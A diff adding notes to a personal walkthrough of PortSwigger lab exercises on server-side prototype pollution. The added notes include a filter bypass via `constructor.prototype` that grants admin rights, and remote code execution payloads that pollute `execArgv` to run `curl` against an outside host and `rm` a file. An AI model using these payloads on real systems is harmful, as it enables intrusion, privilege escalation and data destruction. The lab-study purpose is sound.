@@ -8,6 +8,7 @@
 - https://portswigger.net/web-security/prototype-pollution/server-side
 - https://portswigger.net/research/server-side-prototype-pollution
 - https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#detecting-sources-for-prototype-pollution
+- https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8
 
 ## DOM XSS via client-side prototype pollution
 
@@ -143,3 +144,29 @@ By browsing through the website we can notice a couple of places where we can tr
 Adding `"__proto__":{"status":499}` to the update request and checking all error pages did not reviel any changes in the website behaviour.
 
 `json spaces` is a property for `ExpressJS`, configuring the json response indentation. Adding `"__proto__":{"json spaces":10}` made a website respond with more indent spaces in the response, which solved the lab.
+
+## Bypassing flawed input filters for server-side prototype pollution
+
+Again we are looking at `POST /my-account/change-address` request.
+
+We can notice that any additional param added to the user update request will be reflected. For example adding `"b":"a"` will respond with the same field in user description. Therefore we can assume that any field the user has, even those inherited from `Object.prototype`, will be reflected here.
+
+Casually adding `"__proto__":{"foo":"bar"}},` to the request will not result in any response change, The param maybe filtered.
+
+But `"constructor":{"prototype":{"foo":"bar"}}` does the trick and the response contains additional `"foo":"bar"` param. Now as one of the first labs we can grant ourselves the admin privillages by payload `"constructor":{"prototype":{"isAdmin":true}}` and solve the lab.
+
+The server side prototype pollution Burp scanner was also able to find the vulnerability here.
+
+## Remote code execution via server-side prototype pollution
+
+The server side prototype polution scanner was able to find prototype pollution in `POST /my-account/change-address` request, for example by modifying response status code, json indentation etc.
+
+Manually testing `json spaces` pollution proved that we are able to conduct prototype pollution.
+
+Once new subproccess is started with `child_process.spawn()` or `child_process.fork()` it uses `execArgv` param with its options. If developers did not specify it, we could pollute it.
+
+Adding `"__proto__":{"execArgv": [   "--eval=require('child_process').execSync('curl https://aaaaaa.free.beeceptor.com')"]}` and running maintanence jobs from admin panel did not made any out-of-bound connections, but they may be blocked by a firewall or `curl` is not available.
+
+But applying payload `"__proto__":{"execArgv": [   "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"]}` solves the lab, which proves we have an RCE.
+
+Due to sollution, out-of-bound connection was possible to Burp Collaborator, but I'm poor, so I had to guess it will work.
